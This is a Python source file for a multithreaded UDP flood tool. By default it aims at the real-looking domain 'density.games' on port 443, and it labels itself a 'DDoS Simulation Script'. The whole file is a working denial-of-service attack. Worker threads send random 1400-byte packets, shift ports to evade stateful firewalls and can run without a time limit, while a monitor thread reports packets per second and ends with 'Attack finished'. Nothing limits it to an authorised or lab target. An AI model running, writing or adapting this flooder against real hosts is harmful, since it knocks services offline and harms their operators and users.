import socket
import threading
import random
import sys
import time
import argparse
from datetime import datetime

# --- Configuration ---
TARGET_HOST = "density.games"
TARGET_PORT = 443  # Default to HTTPS/HTTP
PROTOCOL = "UDP"    # UDP is best for flooding; TCP for connection exhaustion
PAYLOAD_SIZE = 1400 # Slightly under MTU to avoid fragmentation issues
NUM_THREADS = 10    # Adjust based on CPU cores (usually 4-16)
DURATION = 60       # Seconds to run (0 for infinite)

# --- Global State ---
stop_flag = threading.Event()
packets_sent = 0

def flood_worker(worker_id):
    """
    Each worker creates its own socket to avoid shared state issues.
    """
    global packets_sent
    
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False) # Non-blocking for better throughput
    
    # Random payload
    # Using os.urandom is slower than random.randbytes in newer Pythons, 
    # but random._urandom is fast enough.
    # For max speed, pre-generate a few payloads and cycle through them.
    payloads = [random._urandom(PAYLOAD_SIZE) for _ in range(10)]
    payload_idx = 0
    
    print(f"[Worker {worker_id}] Started")
    
    while not stop_flag.is_set():
        try:
            # Randomize destination port within a range to confuse stateful firewalls
            # If you want to target a specific port, set random_port = False
            if random.random() < 0.1: # 10% chance to change port strategy
                target_port = TARGET_PORT + random.randint(0, 100)
            else:
                target_port = TARGET_PORT
            
            # Select payload
            data = payloads[payload_idx]
            payload_idx = (payload_idx + 1) % len(payloads)
            
            # Send packet
            sock.sendto(data, (TARGET_HOST, target_port))
            packets_sent += 1
            
            # Throttle slightly to prevent CPU starvation on very fast machines
            # time.sleep(0.0001) # Uncomment if CPU usage is 100% and you want to balance
            
        except Exception as e:
            # Catch socket errors (e.g., no route to host)
            # Don't crash the worker, just log and retry
            if not stop_flag.is_set():
                print(f"[Worker {worker_id}] Error: {e}")
                time.sleep(0.01)
    
    sock.close()
    print(f"[Worker {worker_id}] Stopped")

def monitor():
    """
    Monitor thread to display stats and handle duration.
    """
    global packets_sent
    
    start_time = time.time()
    last_stats_time = start_time
    last_packets = 0
    
    print(f"\n{'='*40}")
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"Protocol: {PROTOCOL}")
    print(f"Threads: {NUM_THREADS}")
    print(f"Duration: {DURATION}s (0=infinite)")
    print(f"{'='*40}\n")
    
    try:
        while not stop_flag.is_set():
            time.sleep(1)
            
            if DURATION > 0 and (time.time() - start_time) >= DURATION:
                print("\n[!] Duration reached, stopping...")
                stop_flag.set()
                break
            
            # Calculate PPS (Packets Per Second)
            current_packets = packets_sent
            pps = (current_packets - last_packets) / (time.time() - last_stats_time)
            total_pps = current_packets / (time.time() - start_time)
            
            # Reset baseline
            last_stats_time = time.time()
            last_packets = current_packets
            
            # Print stats (Throttled to once per second)
            print(f"\r[STATS] Total: {current_packets:>10} | PPS: {pps:>8.0f} | Avg: {total_pps:>8.0f} | Time: {int(time.time() - start_time)}s", end="")
            
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        stop_flag.set()

def main():
    parser = argparse.ArgumentParser(description="DDoS Simulation Script")
    parser.add_argument("--host", default="density.games", help="Target hostname/IP")
    parser.add_argument("--port", type=int, default=443, help="Target port")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (0 for infinite)")
    parser.add_argument("--payload", type=int, default=1400, help="Payload size in bytes")
    
    args = parser.parse_args()
    
    global TARGET_HOST, TARGET_PORT, NUM_THREADS, DURATION, PAYLOAD_SIZE
    TARGET_HOST = args.host
    TARGET_PORT = args.port
    NUM_THREADS = args.threads
    DURATION = args.duration
    PAYLOAD_SIZE = args.payload
    
    print(f"[*] Initializing DDoS simulation against {TARGET_HOST}:{TARGET_PORT}")
    
    # Resolve hostname to IP for faster socket operations
    try:
        resolved_ip = socket.gethostbyname(TARGET_HOST)
        print(f"[*] Resolved {TARGET_HOST} to {resolved_ip}")
        TARGET_HOST = resolved_ip
    except Exception as e:
        print(f"[!] Failed to resolve host: {e}")
        return

    # Start monitor thread
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.start()
    
    # Start flood workers
    workers = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood_worker, args=(i,))
        t.start()
        workers.append(t)
        time.sleep(0.05) # Stagger start to avoid thundering herd

    # Wait for all workers to finish
    for t in workers:
        t.join()
    
    print(f"\n[!] Attack finished. Total packets sent: {packets_sent}")

if __name__ == "__main__":
    main()
